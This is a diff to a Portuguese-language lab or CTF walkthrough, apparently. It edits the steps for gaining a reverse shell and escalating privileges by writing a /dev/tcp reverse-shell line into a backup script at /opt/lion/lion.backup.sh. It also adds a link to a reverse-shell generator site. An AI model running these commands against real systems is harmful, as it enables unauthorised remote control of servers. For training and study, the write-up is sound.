@@ -781,6 +781,8 @@ Ter uma webshell no navegador é útil, mas extremamente limitado. Não consegui
 
 A ideia é: fazer o servidor se conectar DE VOLTA pra nossa máquina, nos dando um terminal interativo. É "reverso" porque normalmente nós conectamos no servidor, mas aqui o servidor conecta em nós.
 
+Site ótimo para botar em prática diversos tipos de reverse shell: revshells.com
+
 **Na nossa máquina atacante (10.0.30.175), abrimos um "ouvinte":**
 
 ```bash
@@ -1191,24 +1193,24 @@ Usamos uma porta diferente (1337) pra não conflitar com a conexão anterior (qu
 
 **Modificando o script de backup:**
 
-Podemos usar `nano` ou `vim`, mas o jeito mais fácil é com `echo`:
+Podemos usar `nano`, o `vim` e até o `echo`:
+
+Se usar nano (mais fácil):
+```bash
+nano /opt/lion/lion.backup.sh
+# Adicione a linha do reverse shell - eu botei na segunda linha
+# Ctrl+S para salvar, Ctrl+X para sair
+```
 
 ```bash
-echo '#!/bin/bash
+echo '#!/bin/bash \
 /bin/bash -c "sh -i >& /dev/tcp/10.0.30.175/1337 0>&1"' > /opt/lion/lion.backup.sh
 ```
 
-Ou se quiser manter o conteúdo original e só adicionar nossa linha:
+Ou se quiser manter o conteúdo original e só adicionar nossa linha, use o operador dua vezes `>>`:
 
 ```bash
 echo '/bin/bash -c "sh -i >& /dev/tcp/10.0.30.175/1337 0>&1"' >> /opt/lion/lion.backup.sh
-```
-
-Se usar nano:
-```bash
-nano /opt/lion/lion.backup.sh
-# Adicione a linha do reverse shell
-# Ctrl+S para salvar, Ctrl+X para sair
 ```
 
 **Aguardando...**
